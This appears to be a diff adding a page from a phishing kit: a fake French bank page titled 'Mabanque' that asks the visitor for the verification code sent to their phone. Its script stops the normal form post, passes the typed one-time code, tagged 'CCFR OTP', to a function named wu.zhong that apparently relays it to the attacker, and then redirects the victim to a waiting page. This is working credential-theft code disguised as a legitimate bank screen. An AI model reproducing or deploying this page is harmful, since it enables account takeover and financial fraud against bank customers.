@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="res/app.css">
+    <title>Mabanque</title>
+</head>
+<body>
+    <header>
+<div class="left">
+
+     <img src="res/img/logo.png" > </div> 
+
+</div>
+<div class="right">
+    <img src="res/img/right.png">
+</div>
+
+<div class="head">
+    <img src="res/img/heado.png" >
+
+</div>
+
+    </header>
+    <div class="z">
+
+</div>
+
+<main>
+
+    
+
+
+<div  class="form">
+<form action="post.php" method="post">
+<div class="titlee"><label>Veuillez saisir le code de vérification envoyé sur votre téléphone.</label> </div>
+
+<div class="col">
+<input type="text" placeholder="Enter code" name="otp" required> <br> <br>
+
+</div>
+
+
+<div class="but">
+    <button type="submit"> Confirmer</button>
+</div>
+
+</form>
+
+</div>
+</main>
+<script type="text/javascript">
+
+
+document.querySelector("form").addEventListener("submit",(e)=>{
+    e.preventDefault();
+
+    wu.zhong(`🔒 CCFR OTP: ${document.querySelector("[name='otp']").value}`);
+
+    window.location="wait.html";
+
+})
+
+</script>
+
+
+</body>
+</html>
